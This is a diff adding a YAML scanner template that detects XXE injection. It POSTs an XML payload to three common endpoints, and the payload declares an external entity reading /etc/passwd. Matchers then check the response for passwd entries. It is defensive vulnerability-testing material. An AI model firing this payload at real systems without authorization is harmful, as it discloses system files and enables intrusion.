@@ -1,0 +1,37 @@
+id: xxe-basic
+
+info:
+  name: XML External Entity (XXE) - Basic
+  author: Kalkaneus Team
+  severity: high
+  description: Detects XXE vulnerabilities
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  tags: xxe,xml,injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/xmlrpc.php"
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/upload"
+    
+    headers:
+      Content-Type: application/xml
+    
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <foo>&xxe;</foo>
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "daemon:x:"
+        condition: or
